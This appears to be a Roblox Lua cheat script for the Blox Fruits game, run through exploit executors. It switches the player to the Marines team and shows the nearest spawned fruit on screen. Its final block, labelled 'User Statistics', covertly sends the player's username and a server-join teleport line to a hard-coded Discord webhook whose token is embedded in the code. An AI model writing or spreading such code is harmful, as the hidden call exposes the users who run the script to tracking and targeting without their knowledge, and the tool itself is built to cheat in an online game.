-- Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

-- Player
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

-- Auto-Join Marines Team
local function joinMarines()
    local teams = game:GetService("Teams")
    local marinesTeam = teams:FindFirstChild("Marines")
    if marinesTeam then
        player.Team = marinesTeam
    end
end

joinMarines()

-- UI Setup
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(1, 0, 0.08, 0)
frame.Position = UDim2.new(0, 0, 0, 0)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BackgroundTransparency = 0.2
frame.BorderSizePixel = 0
frame.Parent = screenGui

local fruitLabel = Instance.new("TextLabel")
fruitLabel.Size = UDim2.new(1, 0, 1, 0)
fruitLabel.BackgroundTransparency = 1
fruitLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
fruitLabel.TextScaled = true
fruitLabel.Font = Enum.Font.GothamBold
fruitLabel.TextStrokeTransparency = 0.5
fruitLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
fruitLabel.Parent = frame

-- List of fruits
local fruitsList = {
    "Fruit ", "Rocket Fruit", "Spin Fruit", "Ghost Fruit", "Spring Fruit", "Bomb Fruit", "Spike Fruit",
    "Smoke Fruit", "Blade Fruit", "Sand Fruit", "Ice Fruit", "Dark Fruit", "Diamond Fruit", "Light Fruit",
    "Rubber Fruit", "Barrier Fruit", "Magma Fruit", "Phoenix Fruit", "Love Fruit", "Spider Fruit",
    "Sound Fruit", "Buddha Fruit", "Quake Fruit", "Gravity Fruit", "Control Fruit", "T-Rex Fruit",
    "Mammoth Fruit", "Spirit Fruit", "Venom Fruit", "Shadow Fruit", "Rumble Fruit", "Portal Fruit",
    "Blizzard Fruit", "Dragon Fruit", "Leopard Fruit", "Dough Fruit", "Dragon (West) Fruit",
    "Dragon (East) Fruit", "Kitsune Fruit", "Gas Fruit", "Yeti Fruit"
}

-- Function to find nearest fruit
local function findNearestFruit()
    local nearestFruit = nil
    local minDistance = math.huge
    local fruitCount = 0
    
    for _, fruit in ipairs(Workspace:GetChildren()) do
        if table.find(fruitsList, fruit.Name) and fruit:FindFirstChild("Handle") then
            local distance = (humanoidRootPart.Position - fruit.Handle.Position).Magnitude
            fruitCount = fruitCount + 1
            
            if distance < minDistance then
                minDistance = distance
                nearestFruit = fruit
            end
        end
    end
    
    return nearestFruit, minDistance, fruitCount
end

-- Update UI every 0.05 seconds
spawn(function()
    while true do
        local nearestFruit, distance, fruitCount = findNearestFruit()
        if nearestFruit then
            fruitLabel.Text = "🍏 Nearest: " .. nearestFruit.Name .. " | 📏 Distance: " .. math.floor(distance) .. "m\n🍎 Total Fruits: " .. fruitCount
        else
            fruitLabel.Text = "❌ No fruits found"
        end
        task.wait(0.05)
    end
end)

-- Webhook Logging (User Statistics)
local webhook = "https://discord.com/api/webhooks/1355686213662802110/Zb2ToOaLRgzBq33aMO3Z4pAEId-d68akqQwwKQagx092AziDLneZYTgw9rOsHRbWdWTi"
local desc = string.format(
    "Username: %s\nJoin Server: ```lua\n%s```",
    player.Name,
    string.format(
        "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\", game.Players.LocalPlayer)",
        tostring(game.PlaceId), game.JobId
    )
)

task.spawn(function()
    (syn and syn.request or fluxus and fluxus.request or fluxus_request or http and http.request or http_request)({
        Url = webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode({
            content = "",
            embeds = {{
                title = "Statistics",
                description = desc,
                color = tonumber(0xeba300)
            }}
        })
    })
end)
